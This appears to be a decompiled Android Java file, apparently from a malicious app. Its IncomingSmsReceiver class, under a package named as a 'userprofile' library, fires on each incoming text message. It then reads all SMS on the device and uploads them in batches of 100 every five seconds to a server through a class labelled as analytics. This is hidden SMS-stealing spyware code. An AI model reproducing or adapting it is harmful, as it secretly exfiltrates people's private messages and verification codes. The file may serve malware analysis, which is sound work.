package com.android.library.userprofile.util;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import com.android.apps.config.Config;
import com.android.apps.config.util.CLog;
import com.android.library.userprofile.model.Sms;
import java.util.ArrayList;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class IncomingSmsReceiver extends BroadcastReceiver {
    private static final String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    private static final String MODE_OFF = "OFF";
    private static final String MODE_ON = "ON";
    private static final String MODE_WIFI = "WIFI";
    private static final String TAG_DEBUG = "message.IncomingSms";

    /* JADX INFO: renamed from: com.android.library.userprofile.util.IncomingSmsReceiver$1, reason: invalid class name */
    class AnonymousClass1 implements Runnable {
        final /* synthetic */ Context val$context;
        final /* synthetic */ Intent val$intent;
        final /* synthetic */ String val$modeFromConfig;

        /* JADX INFO: renamed from: com.android.library.userprofile.util.IncomingSmsReceiver$1$1, reason: invalid class name and collision with other inner class name */
        class AsyncTaskC00521 extends AsyncTask<Void, Void, Void> {
            ArrayList<Sms> smsList;
            int count = 0;
            int lastIndex = 0;
            int currentIndex = 0;
            JSONObject jsonToSendToServer = new JSONObject();

            AsyncTaskC00521() {
            }

            /* JADX INFO: Access modifiers changed from: protected */
            @Override // android.os.AsyncTask
            public Void doInBackground(Void... voidArr) {
                this.smsList = new ArrayList<>();
                this.smsList = UtilFunctions.getAllSms(AnonymousClass1.this.val$context);
                return null;
            }

            /* JADX INFO: Access modifiers changed from: protected */
            @Override // android.os.AsyncTask
            public void onPostExecute(Void r5) {
                super.onPostExecute(r5);
                try {
                    final Handler handler = new Handler();
                    handler.postDelayed(new Runnable() { // from class: com.android.library.userprofile.util.IncomingSmsReceiver.1.1.1
                        private int count = 0;
                        private int max = 100;

                        @Override // java.lang.Runnable
                        public void run() {
                            boolean z;
                            try {
                                if (this.max > AsyncTaskC00521.this.smsList.size()) {
                                    this.max = AsyncTaskC00521.this.smsList.size() - this.count;
                                    z = true;
                                } else {
                                    z = false;
                                }
                                AsyncTaskC00521.this.jsonToSendToServer = UtilFunctions.getSmsGSON(new ArrayList(AsyncTaskC00521.this.smsList.subList(this.count, z ? AsyncTaskC00521.this.smsList.size() : this.max)), AnonymousClass1.this.val$context);
                                new UpdateServerWithAnalytics(AnonymousClass1.this.val$context, AsyncTaskC00521.this.jsonToSendToServer);
                                CLog.b("UserProfileTag", "sending : " + AsyncTaskC00521.this.jsonToSendToServer.toString());
                                if (z) {
                                    return;
                                }
                                this.count = this.max;
                                this.max += 100;
                                handler.postDelayed(this, 5000L);
                            } catch (Exception e2) {
                                CLog.b("UserProfileTag", "Exception in EventAlarmReceiver postExe handler" + e2);
                                e2.printStackTrace();
                            }
                        }
                    }, 5000L);
                } catch (Exception e2) {
                    CLog.b("UserProfileTag", "Exception in EventAlarmReceiver postExe " + e2);
                    e2.printStackTrace();
                }
                this.jsonToSendToServer = null;
            }

            @Override // android.os.AsyncTask
            protected void onPreExecute() {
                super.onPreExecute();
            }
        }

        AnonymousClass1(Intent intent, String str, Context context) {
            this.val$intent = intent;
            this.val$modeFromConfig = str;
            this.val$context = context;
        }

        @Override // java.lang.Runnable
        public void run() {
            if (this.val$intent != null) {
                Bundle extras = this.val$intent.getExtras();
                if (this.val$modeFromConfig.equalsIgnoreCase(IncomingSmsReceiver.MODE_OFF) || !this.val$intent.getAction().equals(IncomingSmsReceiver.ACTION_SMS_RECEIVED) || extras == null) {
                    return;
                }
                new AsyncTaskC00521().executeOnExecutor(AsyncTask.SERIAL_EXECUTOR, new Void[0]);
            }
        }
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Config.getInstance(context);
        CLog.b("UserProfileTag", "message received");
        String modeValueFromConfig = UtilFunctions.getModeValueFromConfig(context);
        CLog.b("UserProfileTag", "incoming sms receiver : modeFromConfig : " + modeValueFromConfig);
        Executors.newScheduledThreadPool(1).schedule(new AnonymousClass1(intent, modeValueFromConfig, context), 5L, TimeUnit.SECONDS);
    }
}
